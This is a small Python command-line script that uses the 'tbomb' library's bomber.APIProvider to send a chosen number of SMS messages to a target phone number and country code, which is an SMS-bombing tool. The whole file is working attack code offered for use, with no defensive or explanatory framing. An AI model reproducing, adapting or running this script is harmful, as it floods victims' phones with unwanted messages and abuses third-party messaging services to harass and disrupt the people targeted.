import argparse
from tbomb import bomber

def Bomb(cc, number, msgs):
    var = bomber.APIProvider(cc, number, 'sms')
    for i in range(0, msgs):
        var.hit()

if __name__=="__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', type=str, default=0, help="Use this Argument to Add Target.")
    parser.add_argument('-t', type=str, default=0, help="Use this Argument to Set Number of Msgs You want to Send.")
    parser.add_argument('-m', type=int, default=0, help="Use this Argument to Set Number of Msgs You want to Send.")
    args = parser.parse_args()
    cc = args.c
    number = args.t
    msgs = args.m
    Bomb(cc, number, msgs)